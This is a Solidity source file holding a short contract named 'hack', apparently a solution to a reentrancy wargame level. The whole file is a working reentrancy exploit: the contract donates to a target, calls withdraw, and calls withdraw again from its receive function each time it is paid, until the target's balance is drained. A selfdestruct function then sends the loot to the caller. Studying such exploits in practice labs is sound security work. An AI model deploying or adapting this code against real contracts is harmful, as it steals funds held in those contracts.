// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
  function donate(address _to) external  payable ; 
  function balanceOf(address _who) external  view returns (uint balance);
  function withdraw(uint _amount) external  ;
  receive() external payable ;
}

contract hack {
  IReentrance target;
  uint value;
  constructor(address _address)  {
    target = IReentrance(payable(_address));
    value = _address.balance;
  }
   

  function attack() public payable {
    target.donate{value: value}(address(this));
    target.withdraw(value);

  }

  receive() external payable {
    target.withdraw(value);
  }

  function withdrawAll() public {
    selfdestruct(payable(msg.sender));
  }
  
}